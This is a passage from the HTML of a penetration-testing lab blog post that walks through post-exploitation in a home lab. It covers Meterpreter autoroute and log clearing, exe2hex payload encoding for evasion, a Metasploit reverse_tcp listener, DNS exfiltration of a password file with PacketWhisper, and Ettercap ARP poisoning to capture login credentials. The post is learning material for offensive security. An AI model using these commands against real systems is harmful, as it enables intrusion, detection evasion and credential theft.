        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Subnet-Route-trace_huc987dce4cb8f9215dd4d89da9edd5274_58302_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Subnet-Route-trace_huc987dce4cb8f9215dd4d89da9edd5274_58302_660x0_resize_box_3.png"
        alt="Subnet-Route-trace"
      />
      
      
    </figure>
  

</p>
<ol start="5">
<li>Give access to these hidden routes with <code>run post/multi/manage/autoroute</code> which will allow connection to these other networks</li>
</ol>
<p>




  
  
  
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="Meterpreter-autoroute.png" alt="Meterpreter-autoroute" />
      
    </figure>
  

</p>


<h3 class="relative group">3.4 Clearing Tracks after Penetration Test 
    <div id="34-clearing-tracks-after-penetration-test" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#34-clearing-tracks-after-penetration-test" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-clearev-tracks_huf5c8b2ff31272374eabbea998f324c19_7527_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-clearev-tracks_huf5c8b2ff31272374eabbea998f324c19_7527_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-clearev-tracks_huf5c8b2ff31272374eabbea998f324c19_7527_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-clearev-tracks_huf5c8b2ff31272374eabbea998f324c19_7527_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-clearev-tracks_huf5c8b2ff31272374eabbea998f324c19_7527_660x0_resize_box_3.png"
        alt="Meterpreter-clearev-tracks"
      />
      
      
    </figure>
  

</p>

  
  
  
  



<div
  
    class="flex px-4 py-3 rounded-md"
    style="background-color: #fcf0e8"
  >

  <span
    
      class="ltr:pr-3 rtl:pl-3 flex items-center"
      style="color: #eb974c"
    >

    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>

  </span>


  </span>

  <span
    
      style="color: #eb974c"
    >Make sure to remove any custom payloads, configuration changes, backdoors after a penetration test on an organisation</span>
</div>



<h2 class="relative group">4. Data Encoding and Exfiltration 
    <div id="4-data-encoding-and-exfiltration" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#4-data-encoding-and-exfiltration" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>ƸӜƷ ƸӜƷ ƸӜƷ Hey I know I&rsquo;ve been talking a lot but I appreaciate you being here reading on, you never know when I&rsquo;ll drop secretes of the story here in the research huh? Well I will be so be on the lookout ƸӜƷ ƸӜƷ ƸӜƷ</p>





<img src="Sweating-rabbit.gif" alt="alt text" style="width: 30px; height: 30px;">

<p>In this section I will be going over encoding payloads to reduce detection rate and also how to extract sensitive files without being detected. I will learn more on encoding Windows executable and how to convert files into DNS queries.</p>


<h3 class="relative group">4.1 Encoding Executable with exe2hex 
    <div id="41-encoding-executable-with-exe2hex" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#41-encoding-executable-with-exe2hex" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Exe2hex is a encoder which comes with Kali that allows for conversions from window executable to ASCII which when ran on a victim will convert back into an executable, this method of encoding isn&rsquo;t an effective way to stay stealthy.</p>
<ol>
<li>Use <code>/usr/bin/exe2hex -x vncviewer.exe</code> to convert the <code>vncviewer.exe</code> encoded file from [[Chapter-7-Understanding-Network-Penetration-Testing#2.2 Using Shellter to reduce detection]]</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Exe2hex-vncviewer_hued92a640339a12e766409b166c866904_20833_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Exe2hex-vncviewer_hued92a640339a12e766409b166c866904_20833_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Exe2hex-vncviewer_hued92a640339a12e766409b166c866904_20833_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Exe2hex-vncviewer_hued92a640339a12e766409b166c866904_20833_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Exe2hex-vncviewer_hued92a640339a12e766409b166c866904_20833_660x0_resize_box_3.png"
        alt="Exe2hex-vncviewer"
      />
      
      
    </figure>
  

</p>
<ol start="2">
<li>Setup a Metasploit listener with the following commands:</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo msfconsole
</span></span><span class="line"><span class="cl">msf6 &gt; use exploit/multi/handler
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> AutoRunScript post/windows/manage/migrate
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 172.30.1.22
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; exploit
</span></span></code></pre></div><ol start="3">
<li>Open a python web server with <code>python3 -m http.server 8080</code> and navigate to the address using the targets client and download the <code>vncviewer.cmd</code> file from the exe2hex encoding</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Download-vnc-python-server_hub5750ebb7cce22458b6fafd481efcea1_67897_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Download-vnc-python-server_hub5750ebb7cce22458b6fafd481efcea1_67897_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Download-vnc-python-server_hub5750ebb7cce22458b6fafd481efcea1_67897_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Download-vnc-python-server_hub5750ebb7cce22458b6fafd481efcea1_67897_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Download-vnc-python-server_hub5750ebb7cce22458b6fafd481efcea1_67897_660x0_resize_box_3.png"
        alt="Download-vnc-python-server"
      />
      
      
    </figure>
  

</p>
<ol start="4">
<li>Run the <code>vncviewer.cmd</code> file, this will reassemble the ASCII file into an executable which can be ran to open a meterpreter shell between Kali and the target</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Running-vnc-cmd_huc80c7b8eb7c7650a1c7af351a00cb753_32423_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Running-vnc-cmd_huc80c7b8eb7c7650a1c7af351a00cb753_32423_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Running-vnc-cmd_huc80c7b8eb7c7650a1c7af351a00cb753_32423_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Running-vnc-cmd_huc80c7b8eb7c7650a1c7af351a00cb753_32423_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Running-vnc-cmd_huc80c7b8eb7c7650a1c7af351a00cb753_32423_660x0_resize_box_3.png"
        alt="Running-vnc-cmd"
      />
      
      
    </figure>
  

</p>
<ol start="5">
<li>After running the executable a meterpreter session has opened</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Multi-handler-meterpreter_hu6215cc2775afada31d7f8c3be1d38014_70976_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Multi-handler-meterpreter_hu6215cc2775afada31d7f8c3be1d38014_70976_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Multi-handler-meterpreter_hu6215cc2775afada31d7f8c3be1d38014_70976_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Multi-handler-meterpreter_hu6215cc2775afada31d7f8c3be1d38014_70976_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Multi-handler-meterpreter_hu6215cc2775afada31d7f8c3be1d38014_70976_660x0_resize_box_3.png"
        alt="Multi-handler-meterpreter"
      />
      
      
    </figure>
  

</p>


<h2 class="relative group">5. Data Exfiltration using PacketWhisper 
    <div id="5-data-exfiltration-using-packetwhisper" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#5-data-exfiltration-using-packetwhisper" aria-label="Anchor">#</a>
    </span>        
    
</h2>


<h3 class="relative group">5.1 Setting up the environment 
    <div id="51-setting-up-the-environment" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#51-setting-up-the-environment" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol>
<li>Install the following packages from git:</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/TryCatchHCF/PacketWhisper
</span></span><span class="line"><span class="cl">wget https://github.com/TryCatchHCF/PacketWhisper/archive/refs/heads/master.zip
</span></span></code></pre></div><ol start="2">
<li>Install the <code>master.zip</code> file using a Python web server with the command <code>python3 -m http.server 8080</code></li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Python-server_hu9b3ab649684031ef644ccd9482559d8e_85540_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Python-server_hu9b3ab649684031ef644ccd9482559d8e_85540_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Python-server_hu9b3ab649684031ef644ccd9482559d8e_85540_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Python-server_hu9b3ab649684031ef644ccd9482559d8e_85540_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Python-server_hu9b3ab649684031ef644ccd9482559d8e_85540_660x0_resize_box_3.png"
        alt="Windows-Python-server"
      />
      
      
    </figure>
  

</p>
<ol start="3">
<li>Install <code>python-2.7.18</code> onto the win2k8 lab machine after transferring, this will allow us to run the PacketWhisper scripts on the machine</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Installing-pyton-2_hu9b3ab649684031ef644ccd9482559d8e_81428_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Installing-pyton-2_hu9b3ab649684031ef644ccd9482559d8e_81428_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Installing-pyton-2_hu9b3ab649684031ef644ccd9482559d8e_81428_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Installing-pyton-2_hu9b3ab649684031ef644ccd9482559d8e_81428_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Installing-pyton-2_hu9b3ab649684031ef644ccd9482559d8e_81428_660x0_resize_box_3.png"
        alt="Installing-pyton-2"
      />
      
      
    </figure>
  

</p>
<ol start="4">
<li>Go to Control Panel &gt; System and Security &gt; System &gt; Advancded system settings &gt; Environment Variables</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/WIndows-System-&amp;-Security_hudbe7c89f96696880681ae90aa6c5db48_92472_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/WIndows-System-&amp;-Security_hudbe7c89f96696880681ae90aa6c5db48_92472_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/WIndows-System-&amp;-Security_hudbe7c89f96696880681ae90aa6c5db48_92472_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/WIndows-System-&amp;-Security_hudbe7c89f96696880681ae90aa6c5db48_92472_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/WIndows-System-&amp;-Security_hudbe7c89f96696880681ae90aa6c5db48_92472_660x0_resize_box_3.png"
        alt="alt text"
      />
      
      
    </figure>
  

</p>
<ol start="5">
<li>Under the System variables section select Path and click on Edit where <code>,C:/Pyton27</code> should be added at the end of the Variable value string. This will allow python programs to run on this dinosaur system</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Edit-system-variable_hu61b61dacb21c797b0b76ccd9a584922a_20591_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Edit-system-variable_hu61b61dacb21c797b0b76ccd9a584922a_20591_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Edit-system-variable_hu61b61dacb21c797b0b76ccd9a584922a_20591_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Edit-system-variable_hu61b61dacb21c797b0b76ccd9a584922a_20591_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Edit-system-variable_hu61b61dacb21c797b0b76ccd9a584922a_20591_660x0_resize_box_3.png"
        alt="Edit-system-variable"
      />
      
      
    </figure>
  

</p>


<h3 class="relative group">5.2 Changing the DNS setting on the compromised host 
    <div id="52-changing-the-dns-setting-on-the-compromised-host" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#52-changing-the-dns-setting-on-the-compromised-host" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>A tool which will allow stealthy file transfer over DNS from a compromised machine to another on a network</p>
<ol>
<li>On the win2k8 machine head to <code>Control Panel &gt; Network and Sharing Center &gt; Change Adapter Settings</code></li>
<li>Then double-click on the <code>PentesNet</code> adaptor and select <strong>Internet Protocol Version 4</strong></li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Network-connection-IPv4_hucd9e35402803ad1f64aa8331707f20de_67722_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Network-connection-IPv4_hucd9e35402803ad1f64aa8331707f20de_67722_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Network-connection-IPv4_hucd9e35402803ad1f64aa8331707f20de_67722_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Network-connection-IPv4_hucd9e35402803ad1f64aa8331707f20de_67722_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Network-connection-IPv4_hucd9e35402803ad1f64aa8331707f20de_67722_660x0_resize_box_3.png"
        alt="Network-connection-IPv4"
      />
      
      
    </figure>
  

</p>


<h3 class="relative group">5.3 Performing Data Exfiltration 
    <div id="53-performing-data-exfiltration" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#53-performing-data-exfiltration" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol start="3">
<li>Extract the <code>master.zip</code> file containing PacketWhisper and cd into it from the compromised machine, create a password file containing credentials</li>
<li>Run the program with <code>python packetWhisper.py</code> and select option 1 to transfer a file via DNS:</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Running-Menu_hub2502f24b877746fb65717d4643b6009_24944_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Running-Menu_hub2502f24b877746fb65717d4643b6009_24944_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Running-Menu_hub2502f24b877746fb65717d4643b6009_24944_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Running-Menu_hub2502f24b877746fb65717d4643b6009_24944_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Running-Menu_hub2502f24b877746fb65717d4643b6009_24944_660x0_resize_box_3.png"
        alt="PacketWhisper-Running-Menu"
      />
      
      
    </figure>
  

</p>
<ol start="5">
<li>Make the following selections below to choose a cipher and a cloak:</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Selection-options_huce917c568659620478a398d517aa5b19_26476_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Selection-options_huce917c568659620478a398d517aa5b19_26476_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Selection-options_huce917c568659620478a398d517aa5b19_26476_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Selection-options_huce917c568659620478a398d517aa5b19_26476_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/PacketWhisper-Selection-options_huce917c568659620478a398d517aa5b19_26476_660x0_resize_box_3.png"
        alt="PacketWhisper-Selection-options"
      />
      
      
    </figure>
  

</p>
<ol start="6">
<li>Agree to view the samples with <code>y</code> and begin transfer while having <strong>Wireshark</strong> opened on Kali listening to traffic coming from the PentesNet 172.30.1.0/24</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Sample-cloaked-files-packets_huc8bdb6e004ac5544055724c685be5edc_19052_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Sample-cloaked-files-packets_huc8bdb6e004ac5544055724c685be5edc_19052_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Sample-cloaked-files-packets_huc8bdb6e004ac5544055724c685be5edc_19052_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Sample-cloaked-files-packets_huc8bdb6e004ac5544055724c685be5edc_19052_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Sample-cloaked-files-packets_huc8bdb6e004ac5544055724c685be5edc_19052_660x0_resize_box_3.png"
        alt="Sample-cloaked-files-packets"
      />
      
      
    </figure>
  

</p>
<ol start="7">
<li>Wireshark will start to collect traffic coming from the compromised system which should be saved into PacketWhisper directory and saved as a pcap for reading</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-request-lookup_huf1e4d793cb1c8af5250beba6e5660932_170411_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-request-lookup_huf1e4d793cb1c8af5250beba6e5660932_170411_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-request-lookup_huf1e4d793cb1c8af5250beba6e5660932_170411_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-request-lookup_huf1e4d793cb1c8af5250beba6e5660932_170411_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-request-lookup_huf1e4d793cb1c8af5250beba6e5660932_170411_660x0_resize_box_3.png"
        alt="Wireshark-request-lookup"
      />
      
      
    </figure>
  

</p>
<ol start="8">
<li>Now that we sneakly sent over a password file over DNS we can read the file over on Kali by running <code>python2 packetWhisper.py</code> and making the following selections:</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Packet-selection-message_hu74c02db5ada1b97815c5e9c434a3e800_98009_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Packet-selection-message_hu74c02db5ada1b97815c5e9c434a3e800_98009_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Packet-selection-message_hu74c02db5ada1b97815c5e9c434a3e800_98009_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Packet-selection-message_hu74c02db5ada1b97815c5e9c434a3e800_98009_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Packet-selection-message_hu74c02db5ada1b97815c5e9c434a3e800_98009_660x0_resize_box_3.png"
        alt="Packet-selection-message"
      />
      
      
    </figure>
  

</p>
<ol start="9">
<li>The file can be read with <code>cat decloaked.file</code></li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Cloak-file-final_hu985e234d4236bd286b33034ba8c9e3e5_8757_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Cloak-file-final_hu985e234d4236bd286b33034ba8c9e3e5_8757_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Cloak-file-final_hu985e234d4236bd286b33034ba8c9e3e5_8757_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Cloak-file-final_hu985e234d4236bd286b33034ba8c9e3e5_8757_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Cloak-file-final_hu985e234d4236bd286b33034ba8c9e3e5_8757_660x0_resize_box_3.png"
        alt="Cloak-file-final"
      />
      
      
    </figure>
  

</p>


<h2 class="relative group">6. Understanding MITM and packet sniffing attacks 
    <div id="6-understanding-mitm-and-packet-sniffing-attacks" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#6-understanding-mitm-and-packet-sniffing-attacks" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>A network will connect devices through switches which constantly send packages containing different types of information, these can contain credentials, documents website visited depending on the protocol used.</p>
<p>An MITM or also known as a Man-in-the-middle attack which sits between packet traffic flow on a network.</p>


<h3 class="relative group">6.1 Using Ettercap to perform a MITM attack 
    <div id="61-using-ettercap-to-perform-a-mitm-attack" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#61-using-ettercap-to-perform-a-mitm-attack" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>MITM can make use of the <strong>Address Resolution Protocol (ARP)</strong>  which resolves a IP to MAC address to map all devices on a network, this is stored within a ARP cache on each host device. I will be using Ettercap to poison the ARP cache to redirect all traffic from both my win2k8 and OWASP BWS lab to my Kali linux machine</p>
<ol>
<li>Make sure both win2k8 and OWASP BWS virtual machines are on the PentesNet network and execute the following command on Kali:</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ettercap -i eth1 -T -q -S -M arp:remote /172.30.1.21// /172.30.1.23//
</span></span></code></pre></div><ol start="2">
<li>On the win2k8 VM go to <code>http://&lt;OWASP-BWA-IP&gt; </code> through a browser which I could then read packages through Wireshark, here we can see HTTP connections being established by both VMs</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-new-packets-lookup_hu433d52cd40e463bdf608188db7b2565a_151286_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-new-packets-lookup_hu433d52cd40e463bdf608188db7b2565a_151286_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-new-packets-lookup_hu433d52cd40e463bdf608188db7b2565a_151286_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-new-packets-lookup_hu433d52cd40e463bdf608188db7b2565a_151286_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Wireshark-new-packets-lookup_hu433d52cd40e463bdf608188db7b2565a_151286_660x0_resize_box_3.png"
        alt="Wireshark-new-packets-lookup"
      />
      
      
    </figure>
  

</p>
<ol start="3">
<li>Confirm that the ARP has been poisoned by Ettercap with <code>arp -a</code> on the win2k8 VM</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/That-fukcing-bird-that-I-hate_hu643af1e1f3ab6c0d904adf79035225aa_97659_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/That-fukcing-bird-that-I-hate_hu643af1e1f3ab6c0d904adf79035225aa_97659_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/That-fukcing-bird-that-I-hate_hu643af1e1f3ab6c0d904adf79035225aa_97659_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/That-fukcing-bird-that-I-hate_hu643af1e1f3ab6c0d904adf79035225aa_97659_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/That-fukcing-bird-that-I-hate_hu643af1e1f3ab6c0d904adf79035225aa_97659_660x0_resize_box_3.png"
        alt="That-fukcing-bird-that-I-hate"
      />
      
      
    </figure>
  

</p>
<ol start="4">
<li>We can send credentials through an unsecure HTTP connection between each VMs by selecting <strong>OWASP WebGoat</strong> which will prompt the user to enter login credentials. This will be picked up by Ettercap</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Login-attempt-owasp_hu60bbc129d7beff86942d38db4baa57ce_92938_330x0_resize_box_3.png 330w,
